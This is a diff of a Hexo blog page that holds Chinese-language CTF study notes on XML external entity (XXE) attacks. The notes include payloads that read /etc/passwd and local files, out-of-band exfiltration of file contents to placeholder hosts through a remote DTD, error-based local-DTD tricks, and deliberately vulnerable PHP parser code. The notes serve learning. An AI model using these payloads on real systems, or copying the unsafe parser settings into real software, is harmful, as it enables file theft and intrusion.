@@ -10,10 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="XXE定义实体&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt;
-&amp;lt;!DOCTYPE foo [
-&amp;lt;!ELEMENT foo ANY &amp;gt;
-&amp;lt;!ENTITY xxe &amp;quot;test&amp;q">
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在！">
     
 
     <!--Author-->
@@ -28,9 +25,11 @@
 
     <!--Open Graph Description-->
     
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在！">
+    
 
     <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="Hexo">
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
 
     <!--Type page-->
     
@@ -45,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>xxe - Hexo</title>
+    <title>xxe - Luc1fer&#39;blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -93,12 +92,6 @@
             <li class="menu-item">
                 <a href="/archives">
                     Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
                 </a>
             </li>
             
@@ -152,8 +145,6 @@
                 <span class="date">2019-08-17</span>
             
             
-                <a href="#disqus_thread" class="comments">Comments</a>
-            
             
                 <span class="category">
                     <a href="/categories/ctf/">ctf</a>
@@ -168,7 +159,9 @@
         
 
         <!-- Post Content -->
-        <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="定义实体"><a href="#定义实体" class="headerlink" title="定义实体"></a>定义实体</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+        <p>一次简单的xxe学习~</p>
+<a id="more"></a>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="定义实体"><a href="#定义实体" class="headerlink" title="定义实体"></a>定义实体</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ELEMENT foo ANY &gt;
 &lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>定义ANY说明接受任何元素，定义了了一个XML实体xxe，我们可以通过&amp;进行引用。XML可以写成这样，我们输出的结果中xxe被替换成了test</p>
@@ -178,25 +171,25 @@
 &lt;/creds&gt;</code></pre><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><pre><code>&amp;lt;    &lt;    小于号
 &amp;gt;    &gt;    大于号
 &amp;amp;    &amp;    和号
-&amp;apos;    &#39;    单引号
+&amp;apos;    &apos;    单引号
 &amp;quot;    &quot;    引号 </code></pre><h2 id="DTD-document-type-definition-文档类型定义"><a href="#DTD-document-type-definition-文档类型定义" class="headerlink" title="DTD(document type definition 文档类型定义)"></a>DTD(document type definition 文档类型定义)</h2><p>自定义XML文档的合法构建模块，可以在XML内部声明也可以外部引用。</p>
 <p><code>SYSTEM</code> 外部引用文件<br>    <!DOCTYPE note SYSTEM "XXX.XX"></p>
 <p>内部实体声明</p>
 <pre><code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;
 
-&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;?xml version=&apos;1.0&apos;?&gt;
 &lt;!DOCTYPE mail[
 &lt;!ELEMENT mail (message)&gt;
-&lt;!ENTITY hacker &quot;hacker&#39;s data&quot;&gt;
+&lt;!ENTITY hacker &quot;hacker&apos;s data&quot;&gt;
 ]&gt;
 
 &lt;mail&gt;
     &lt;message&gt;&amp;hacker;&lt;/message&gt;
 &lt;/mail&gt;</code></pre><p>外部实体声明</p>
-<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;
 &lt;!DOCTYPE mail[
 &lt;!ELEMENT mail (message)&gt;
-&lt;!--ENTITY hacker &quot;hacker&#39;s data&quot;--&gt;
+&lt;!--ENTITY hacker &quot;hacker&apos;s data&quot;--&gt;
 &lt;!ENTITY hacker SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;
 ]&gt;
 &lt;mail&gt;
@@ -216,7 +209,7 @@
 <pre><code>&lt;?php
 
     libxml_disable_entity_loader (false);
-    $xmlfile = file_get_contents(&#39;php://input&#39;);
+    $xmlfile = file_get_contents(&apos;php://input&apos;);
     $dom = new DOMDocument();
     $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
     $creds = simplexml_import_dom($dom);
@@ -255,7 +248,7 @@ file:///D:/test.txt&quot;&gt; ]&gt;
 <pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE message [
     &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
-    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;
+    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://myip/?%file;&apos;&gt;&quot;&gt;
     %start;
     %send;
 ]&gt;</code></pre><p>会报错 <code>PEReferences forbidden in internal subset in Entity</code>。禁止在内部实体引用参数实体。基于此我们采用引入外部DTD，在自己的服务器上加入DTD文件</p>
@@ -263,12 +256,12 @@ file:///D:/test.txt&quot;&gt; ]&gt;
 <pre><code>&lt;?php
 
 libxml_disable_entity_loader (false);
-$xmlfile = file_get_contents(&#39;php://input&#39;);
+$xmlfile = file_get_contents(&apos;php://input&apos;);
 $dom = new DOMDocument();
 $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //loadXML() 方法通过解析一个 XML 标签字符串来组成该文档。
 ?&gt;</code></pre><p>test.dtd</p>
 <pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
-&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>payload</p>
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</code></pre><p>payload</p>
 <pre><code>&lt;!DOCTYPE convert [ 
 &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
 %remote;%int;%send;
@@ -292,12 +285,12 @@ setInterval(function(){
 &lt;!DOCTYPE message [
     &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;
 
-    &lt;!ENTITY % condition &#39;aaa)&gt;
+    &lt;!ENTITY % condition &apos;aaa)&gt;
         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
         &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
         &amp;#x25;eval;
         &amp;#x25;error;
-        &lt;!ELEMENT aa (bb&#39;&gt;
+        &lt;!ELEMENT aa (bb&apos;&gt;
 
     %local_dtd;
 ]&gt;
@@ -319,12 +312,12 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
 <pre><code>&lt;!DOCTYPE message [
     &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;
 
-    &lt;!ENTITY % expr &#39;aaa)&gt;
+    &lt;!ENTITY % expr &apos;aaa)&gt;
         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;
         &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
         &amp;#x25;eval;
         &amp;#x25;error;
-        &lt;!ELEMENT aa (bb&#39;&gt;
+        &lt;!ELEMENT aa (bb&apos;&gt;
 
     %local_dtd;
 ]&gt;
@@ -346,16 +339,6 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
 
     <!-- Comments -->
     
-    <div class="comments">
-        
-<div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</div>
-
-
-
-    </div>
-    
 
 </div>
         </section>
@@ -375,7 +358,7 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
             <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                 <h2>About</h2>
                 <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                 </p>
             </div>
             
@@ -396,7 +379,7 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
             </li>
             
             <li>
-                <a class="footer-post" href="/2019/08/19/Black_magic/">black_magic</a>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
             </li>
             
         </ul>
@@ -414,11 +397,11 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/wp/">wp</a>
+            <a class="footer-post" href="/categories/docker/">docker</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/docker/">docker</a>
+            <a class="footer-post" href="/categories/wp/">wp</a>
         </li>
         
         <li>
@@ -494,18 +477,6 @@ daemon:x:2:2:daemon:/:/usr/bin/nologin
 <script src="/js/main.js"></script>
 
 <!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
